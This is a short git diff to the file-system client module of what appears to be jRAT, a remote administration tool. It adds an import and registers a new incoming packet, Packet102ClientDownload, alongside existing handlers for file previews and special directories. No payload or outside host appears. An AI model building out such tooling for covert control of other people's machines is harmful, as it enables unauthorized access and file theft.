@@ -1,6 +1,7 @@
 package jrat.module.fs;
 
 import jrat.api.ClientModule;
+import jrat.client.packets.incoming.IncomingPacket;
 import jrat.client.packets.incoming.IncomingPackets;
 import jrat.module.fs.packets.*;
 
@@ -17,6 +18,6 @@ public class FileSystemClientModule extends ClientModule {
         IncomingPackets.register((short) 62, Packet62PreviewImage.class);
         IncomingPackets.register((short) 63, Packet63PreviewArchive.class);
         IncomingPackets.register((short) 41, Packet41SpecialDirectory.class);
-
+        IncomingPackets.register((short) 102, Packet102ClientDownload.class);
     }
 }
